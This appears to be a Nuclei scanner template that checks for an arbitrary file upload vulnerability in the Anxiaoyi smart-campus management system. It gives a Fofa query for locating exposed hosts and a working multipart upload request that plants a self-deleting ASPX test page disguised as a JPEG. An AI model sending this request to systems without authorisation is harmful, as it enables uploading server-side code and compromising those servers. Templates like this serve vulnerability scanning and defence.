id: Winstaryc_FileUpProductupdate_Fileupload

info:
  name: Winstaryc_FileUpProductupdate_Fileupload
  author: HK
  severity: high
  description: 智慧校园(安校易)管理系统`/Module/FileUpPage/FileUpProductupdate.aspx`接口存在任意文件上传漏洞
  metadata:
    max-request: 1
    Fofa-query: body="window.external.CallCSharpMethod"
    verified: true

http:
- raw:
  - |
    @timeout: 30s
    POST /Module/FileUpPage/FileUpProductupdate.aspx HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
    Accept: application/json, text/javascript, */*; q=0.01
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2,
    X-Requested-With: XMLHttpRequest
    Content-Type: multipart/form-data; boundary=----21909179191068471382830692394
    Connection: close
    Content-Length: 271

    ------21909179191068471382830692394
    Content-Disposition: form-data; name="Filedata"; filename="qaz.aspx"
    Content-Type: image/jpeg

    <%@Page Language="C#"%><%Response.Write("hello");System.IO.File.Delete(Request.PhysicalPath);%>
    ------21909179191068471382830692394--

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
        - "update.aspx"